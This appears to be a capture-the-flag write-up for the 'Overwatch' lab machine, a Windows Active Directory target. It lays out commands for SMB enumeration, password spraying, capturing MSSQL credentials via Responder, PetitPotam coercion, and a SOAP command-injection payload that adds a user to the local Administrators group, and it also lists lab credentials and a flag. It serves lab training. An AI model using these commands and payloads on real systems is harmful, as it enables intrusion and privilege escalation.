Overwatch Writeup

Author: atrox | Tags: Active Directory, WCF, MSSQL, PetitPotam, Unconstrained Delegation, SOAP Injection

Overview

Overwatch is a Windows Active Directory machine that chains together several attack techniques: SMB enumeration leading to credential discovery in a .NET binary, SQL linked-server abuse to capture cleartext credentials via Responder, a foothold via WinRM, and finally privilege escalation through a vulnerable WCF SOAP service running as SYSTEM.

Reconnaissance

Nmap

nmap -sV 10.129.16.26 -vvv
PortService
53DNS
88Kerberos
135MSRPC
389LDAP (Domain: overwatch.htb)
445SMB
3389RDP
3268LDAP Global Catalog

The LDAP banner reveals the domain: overwatch.htb / host: S200401. Add to your hosts file:

10.129.16.26 overwatch.htb

Enumeration

SMB — Anonymous Access

crackmapexec smb 10.129.16.26 -u guest -p '' --shares

Accessible shares include IPC$ and software$ (READ access ✅).

Exploring the software$ Share

Inside \Monitoring\ there's a .NET application: overwatch.exe, along with its config file and PDB. Retrieving these files allows for local analysis:

smbclient //10.129.16.26/software$ -U guest%
get overwatch.exe.config
get overwatch.exe

WCF Service Discovery

The config file reveals a WCF service endpoint. Port 8000 is filtered externally, meaning the service is only accessible from within the machine:

<add baseAddress="http://overwatch.htb:8000/MonitorService" />

Credentials in the Binary

Running strings against overwatch.exe reveals a hardcoded SQL connection string:

Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;

User Enumeration & Spray

./kerbrute userenum --dc 10.129.16.26 -d overwatch.htb users.txt

Discovered valid users: guest, administrator, sqlsvc, S200401. A password spray confirms the following credentials:

  • sqlsvc : TI0LKcfHzZw1Vv
  • svc_monitor : Overwatch2026!

Lateral Movement — MSSQL Linked Server

Connecting to MSSQL as sqlsvc, we find a linked server named SQL07. By querying it while spoofing DNS to point SQL07 to our Kali IP, we capture credentials via Responder:

EXEC('SELECT * FROM OPENQUERY(SQL07, ''SELECT 1'')');
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx

Initial Foothold — WinRM

evil-winrm -i 10.129.17.170 -u sqlmgmt -p 'bIhBbzMMnB82yx'

🚩 User flag captured: f1bace098dfaaeebb7d56bd1243a5b83

Bonus: PetitPotam (Machine Hash)

BloodHound reveals the DC has Unconstrained Delegation. Using PetitPotam to coerce authentication to our listener captures the machine account hash (S200401$), enabling further escalation paths.

Privilege Escalation — WCF SOAP Injection

The WCF service exposes a KillProcess method vulnerable to command injection. We send a crafted SOAP request to add our user to the local Administrators group:

# SOAP Injection Payload
iwr http://overwatch.htb:8000/MonitorService `
  -Method POST `
  -Headers @{
    "Content-Type"  = "text/xml; charset=utf-8"
    "SOAPAction"    = '"http://tempuri.org/IMonitoringService/KillProcess"'
  } `
  -Body "<s:Envelope xmlns:s='http://schemas.xmlsoap.org/soap/envelope/'>
    <s:Body>
      <KillProcess xmlns='http://tempuri.org/'>
        <processName>notepad; net localgroup Administrators sqlmgmt /add</processName>
      </KillProcess>
    </s:Body>
  </s:Envelope>"

Verifying with net localgroup Administrators confirms success. A new Evil-WinRM session grants full root access.

Attack Chain Summary

SMB Anonymous → WCF Config → SQL Creds → SQL Linked Server → Responder → WinRM → WCF Injection → Local Admin
